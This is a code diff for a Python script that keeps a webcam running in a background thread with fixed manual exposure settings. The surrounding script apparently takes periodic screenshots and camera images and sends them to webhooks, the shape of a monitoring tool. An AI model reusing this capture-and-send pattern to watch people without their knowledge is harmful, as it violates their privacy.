@@ -184,69 +184,180 @@ def detect_and_initialize_camera():
     camera_initialized = False
     return False
 
+def configure_camera_manual_settings(cap):
+    """Configure camera with manual settings to completely disable flash/auto-adjustments"""
+    try:
+        # Try to disable ALL auto features first
+        try:
+            # For DSHOW backend, auto exposure value is 0.25 for manual mode
+            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure mode
+        except:
+            pass
+        
+        try:
+            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # Turn OFF autofocus
+        except:
+            pass
+        
+        try:
+            cap.set(cv2.CAP_PROP_AUTO_WB, 0)  # Turn OFF auto white balance
+        except:
+            pass
+        
+        # Now set fixed manual values to prevent any automatic adjustments
+        
+        # Set exposure to a fixed middle value (prevents sudden brightness changes)
+        # Lower values = darker, higher values = brighter
+        # Typical range: 0.0 to 1.0 or sometimes -13 to -1
+        try:
+            # Try different exposure values based on camera
+            cap.set(cv2.CAP_PROP_EXPOSURE, 0.5)  # Middle exposure
+        except:
+            try:
+                cap.set(cv2.CAP_PROP_EXPOSURE, -6)  # Alternative value for some cameras
+            except:
+                pass
+        
+        # Set fixed white balance (neutral value)
+        try:
+            cap.set(cv2.CAP_PROP_WB_TEMPERATURE, 4500)  # Neutral white balance (4500K)
+        except:
+            pass
+        
+        # Set fixed gain/ISO
+        try:
+            cap.set(cv2.CAP_PROP_GAIN, 0)  # Minimum gain to reduce noise/auto-adjust
+        except:
+            pass
+        
+        # Set fixed brightness
+        try:
+            cap.set(cv2.CAP_PROP_BRIGHTNESS, 50)  # Middle brightness (0-100)
+        except:
+            pass
+        
+        # Set fixed contrast
+        try:
+            cap.set(cv2.CAP_PROP_CONTRAST, 50)  # Middle contrast (0-100)
+        except:
+            pass
+        
+        # Set fixed saturation
+        try:
+            cap.set(cv2.CAP_PROP_SATURATION, 50)  # Middle saturation (0-100)
+        except:
+            pass
+        
+        # Set fixed sharpness
+        try:
+            cap.set(cv2.CAP_PROP_SHARPNESS, 0)  # Disable sharpness enhancement
+        except:
+            pass
+        
+        # Set fixed gamma
+        try:
+            cap.set(cv2.CAP_PROP_GAMMA, 100)  # Normal gamma
+        except:
+            pass
+        
+        # Set fixed backlight compensation
+        try:
+            cap.set(cv2.CAP_PROP_BACKLIGHT, 0)  # Disable backlight compensation
+        except:
+            pass
+        
+        # Set lower resolution for faster, more stable capture
+        try:
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        except:
+            pass
+        
+        # Set fixed framerate
+        try:
+            cap.set(cv2.CAP_PROP_FPS, 15)  # Lower FPS for stability
+        except:
+            pass
+        
+        return True
+        
+    except Exception as e:
+        print(f"[CAMERA CONFIG ERROR] {e}")
+        return False
+
 def camera_background_thread():
-    """Background thread that continuously captures camera frames"""
+    """Background thread that continuously captures camera frames without flash"""
     global camera_capture, camera_frame, camera_running, camera_warmup_complete
     
     try:
-        # Initialize camera
+        # Initialize camera with manual settings
         camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
         if not camera_capture.isOpened():
             print("[CAMERA] Could not open camera in background thread")
             camera_running = False
             return
         
-        # Configure camera to reduce flash/auto-adjustment
-        try:
-            # Try to set manual settings to reduce flash
-            camera_capture.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure
-            camera_capture.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # Turn off autofocus
-            camera_capture.set(cv2.CAP_PROP_AUTO_WB, 0)  # Turn off auto white balance
-            
-            # Set some reasonable defaults
-            camera_capture.set(cv2.CAP_PROP_EXPOSURE, 0.5)  # Middle exposure
-            camera_capture.set(cv2.CAP_PROP_FRAME_WIDTH, 640)  # Lower resolution for speed
-            camera_capture.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-        except Exception as e:
-            print(f"[CAMERA SETTINGS] Some settings not supported: {e}")
+        print("[CAMERA] Configuring camera with manual settings to disable flash...")
+        
+        # Apply manual configuration
+        config_success = configure_camera_manual_settings(camera_capture)
+        
+        if config_success:
+            print("[CAMERA] Manual configuration applied successfully")
+        else:
+            print("[CAMERA] Some camera settings could not be configured")
         
         print("[CAMERA] Background camera thread started")
         
-        # Warm up the camera by reading initial frames
-        warmup_frames = 15
+        # WARMUP PHASE: Let camera stabilize with manual settings
+        print("[CAMERA] Starting camera warmup (this eliminates flash)...")
+        warmup_frames = 30  # More frames for better stabilization
         for i in range(warmup_frames):
             ret, frame = camera_capture.read()
             if ret and frame is not None:
                 with camera_lock:
                     camera_frame = frame
-                time.sleep(0.03)  # Small delay between warmup frames
+                # Gradually increase wait time to let camera fully stabilize
+                wait_time = 0.05 + (i * 0.01)  # From 0.05 to 0.35 seconds
+                time.sleep(wait_time)
+            else:
+                print(f"[CAMERA] Failed to read warmup frame {i+1}")
         
         camera_warmup_complete = True
-        print("[CAMERA] Camera warmup complete")
+        print("[CAMERA] Camera warmup complete - Flash should be eliminated")
         
-        # Main camera loop
+        # MAIN LOOP: Continuously capture frames
+        frame_count = 0
         while camera_running:
             try:
                 ret, frame = camera_capture.read()
+                
                 if ret and frame is not None:
                     with camera_lock:
                         camera_frame = frame
+                    
+                    frame_count += 1
+                    
+                    # Every 100 frames, check if we need to re-read to keep camera active
+                    if frame_count % 100 == 0:
+                        # Small sleep to prevent 100% CPU usage
+                        time.sleep(0.001)
                 else:
-                    print("[CAMERA] Failed to read frame, attempting to reopen...")
-                    # Try to reopen camera
-                    camera_capture.release()
-                    time.sleep(0.5)
-                    camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
-                    if not camera_capture.isOpened():
-                        print("[CAMERA] Could not reopen camera")
-                        break
+                    # Occasionally frames fail - just continue
+                    if frame_count % 10 == 0:
+                        print("[CAMERA] Frame capture failed, continuing...")
+                    
+                    # Small sleep to prevent busy loop on failure
+                    time.sleep(0.1)
                 
-                # Small delay to reduce CPU usage (15-30 FPS is sufficient)
-                time.sleep(0.033)  # ~30 FPS
+                # Small delay to maintain ~15-20 FPS (enough for our use)
+                # This also helps prevent any timing-related flashes
+                time.sleep(0.05)  # ~20 FPS
                 
             except Exception as e:
                 print(f"[CAMERA LOOP ERROR] {e}")
-                time.sleep(1)
+                # Brief pause before retrying
+                time.sleep(0.5)
     
     except Exception as e:
         print(f"[CAMERA THREAD ERROR] {e}")
@@ -255,10 +366,11 @@ def camera_background_thread():
             camera_capture.release()
             camera_capture = None
         camera_running = False
+        camera_warmup_complete = False
         print("[CAMERA] Background camera thread stopped")
 
 def start_camera_background():
-    """Start the background camera thread"""
+    """Start the background camera thread with flash elimination"""
     global camera_running, camera_initialized
     
     if not camera_initialized:
@@ -273,10 +385,10 @@ def start_camera_background():
     camera_thread = threading.Thread(target=camera_background_thread, daemon=True)
     camera_thread.start()
     
-    # Wait a moment for camera to start
-    time.sleep(0.5)
+    # Wait for camera thread to initialize
+    time.sleep(1.0)
     
-    print("[CAMERA] Background camera started")
+    print("[CAMERA] Background camera started with flash elimination")
     return True
 
 def stop_camera_background():
@@ -287,7 +399,7 @@ def stop_camera_background():
     print("[CAMERA] Background camera stopped")
 
 def take_camera_picture():
-    """Get the latest frame from the background camera"""
+    """Get the latest frame from the background camera (flash-free)"""
     global camera_frame, camera_warmup_complete, camera_running
     
     if not camera_initialized or not camera_running:
@@ -295,12 +407,15 @@ def take_camera_picture():
         return None
     
     if not camera_warmup_complete:
-        print("[CAMERA] Camera still warming up...")
-        # Wait a bit for warmup
-        for _ in range(10):
+        print("[CAMERA] Camera still warming up (no flash during warmup)...")
+        # Wait up to 2 seconds for warmup to complete
+        for _ in range(40):
             if camera_warmup_complete:
                 break
-            time.sleep(0.1)
+            time.sleep(0.05)
+        
+        if not camera_warmup_complete:
+            print("[CAMERA] Camera warmup taking too long, proceeding anyway")
     
     with camera_lock:
         if camera_frame is None:
@@ -313,6 +428,10 @@ def take_camera_picture():
             
             # Convert BGR to RGB
             frame_rgb = cv2.cvtColor(frame_copy, cv2.COLOR_BGR2RGB)
+            
+            # Apply minimal post-processing to ensure consistent output
+            # (No auto-adjustments that could cause flash-like effects)
+            
             # Convert to PIL Image
             camera_image = Image.fromarray(frame_rgb)
             
@@ -757,10 +876,10 @@ print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds
 print("[CAMERA] Initializing camera...")
 camera_available = detect_and_initialize_camera()
 if camera_available:
-    print("[CAMERA] Starting background camera thread...")
+    print("[CAMERA] Starting background camera thread with flash elimination...")
     camera_started = start_camera_background()
     if camera_started:
-        print("[CAMERA] Background camera running (no flash on capture)")
+        print("[CAMERA] Background camera running with flash elimination")
         
         # Start camera keepalive monitor
         camera_monitor_thread = threading.Thread(target=camera_keepalive_monitor, daemon=True)
@@ -841,7 +960,7 @@ try:
                         # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
-                        # Take camera picture from background camera
+                        # Take camera picture from background camera (flash-free)
                         camera_image = take_camera_picture()
                         
                         # Send alert to both webhooks
